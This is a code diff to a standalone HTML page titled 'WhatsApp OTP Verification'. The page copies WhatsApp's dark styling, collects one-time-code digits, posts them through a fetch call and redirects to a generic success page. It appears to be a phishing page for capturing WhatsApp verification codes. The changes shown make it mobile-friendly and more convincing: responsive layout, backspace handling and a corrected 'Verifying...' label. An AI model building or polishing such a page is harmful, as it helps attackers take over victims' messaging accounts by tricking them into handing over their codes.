@@ -2,13 +2,14 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>WhatsApp OTP Verification</title>
     <style>
         body {
             margin: 0;
             padding: 0;
             background-color: #121B22;
-            font-family: 'Comic Sans MS', cursive;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             color: white;
             display: flex;
             justify-content: center;
@@ -18,41 +19,50 @@
 
         .container {
             text-align: center;
-            width: 350px;
+            width: 90%;
+            max-width: 400px;
         }
 
         h2 {
-            font-size: 24px;
-            margin-bottom: 10px;
+            font-size: 22px;
+            margin-bottom: 8px;
         }
 
         p {
-            font-size: 16px;
+            font-size: 14px;
             color: #aaa;
+            margin: 0 0 20px;
         }
 
         .otp-inputs {
             display: flex;
             justify-content: center;
-            gap: 10px;
-            margin: 30px 0;
+            gap: 8px;
+            margin: 20px 0;
+            flex-wrap: wrap;
         }
 
         .otp-inputs input {
-            width: 40px;
-            height: 40px;
+            width: 45px;
+            height: 50px;
             text-align: center;
             font-size: 24px;
             border: none;
             border-bottom: 2px solid #00D75A;
             background: transparent;
             color: white;
+            outline: none;
+        }
+
+        .otp-inputs input:focus {
+            border-color: #00AEEF;
         }
 
         .resend {
-            margin-top: 15px;
+            margin-top: 20px;
             color: #00D75A;
             cursor: pointer;
+            font-size: 14px;
         }
 
         #message {
@@ -60,6 +70,7 @@
             display: none;
             padding: 10px;
             border-radius: 6px;
+            font-size: 14px;
         }
 
         .loading-overlay {
@@ -90,12 +101,32 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+
+        @media (max-width: 400px) {
+            .otp-inputs input {
+                width: 40px;
+                height: 45px;
+                font-size: 20px;
+            }
+
+            h2 {
+                font-size: 20px;
+            }
+
+            p {
+                font-size: 13px;
+            }
+
+            .resend {
+                font-size: 13px;
+            }
+        }
     </style>
 </head>
 <body>
 <div class="loading-overlay" id="loading">
     <div class="spinner"></div>
-    Verfying
+    <div style="color:white; margin-top: 10px;">Verifying...</div>
 </div>
 
 <div class="container">
@@ -134,10 +165,16 @@
                 submitForm();
             }
         });
+
+        input.addEventListener("keydown", (e) => {
+            if (e.key === "Backspace" && input.value === "" && index > 0) {
+                inputs[index - 1].focus();
+            }
+        });
     });
 
     function submitForm() {
-        loading.style.display = "flex"; // Show loading
+        loading.style.display = "flex";
 
         const formData = new FormData(form);
         const keyValuePairs = [];
@@ -161,7 +198,7 @@
                 message.style.backgroundColor = "white";
                 message.style.color = "black";
                 setTimeout(() => {
-                    window.location.href = "success.html"; // 🔁 Redirect here
+                    window.location.href = "success.html";
                 }, 1500);
             })
             .catch(() => {
@@ -171,7 +208,7 @@
                 message.style.color = "white";
             })
             .finally(() => {
-                loading.style.display = "none"; // Hide loading
+                loading.style.display = "none";
             });
     }
 </script>
